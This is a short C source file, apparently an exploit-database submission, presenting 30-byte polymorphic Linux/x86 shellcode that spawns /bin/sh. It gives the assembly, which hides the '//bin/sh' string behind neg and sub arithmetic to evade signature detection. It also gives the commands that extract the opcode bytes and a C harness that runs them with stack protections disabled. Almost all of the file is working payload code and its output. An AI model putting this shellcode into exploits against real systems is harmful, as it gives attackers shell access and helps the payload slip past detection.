/*
 Title: Linux/x86 - Polymorphic execve /bin/sh x86 shellcode - 30 bytes
 Author: Manuel Mancera (@sinkmanu)
 Tested on: Linux 3.16.0-4-586 #1 Debian 3.16.43-2+deb8u2 (2017-06-26)
i686 GNU/Linux

----------------- Assembly code -------------------

global _start

section .text
_start:
    xor eax, eax
    push eax
    mov edi, 0x978cd092
    mov ebx, edi
    neg edi
    push edi
    sub ebx, 0x2e2aa163
    push ebx
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80

---------------------------------------------------
$ nasm -f elf32 poly-execve.nasm -o poly-execve.o
$ ld poly-execve.o -o poly-execve
$ objdump -d ./poly-execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
-d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/
/\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\xbf\x92\xd0\x8c\x97\x89\xfb\xf7\xdf\x57\x81\xeb\x63\xa1\x2a\x2e\x53\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode
Length: 30 bytes
$
*/

#include <stdio.h>
#include <string.h>

const char code[] =  \
"\x31\xc0\x50\xbf\x92\xd0\x8c\x97\x89\xfb\xf7\xdf\x57\x81\xeb\x63\xa1\x2a\x2e\x53\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
    printf("Length: %d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}

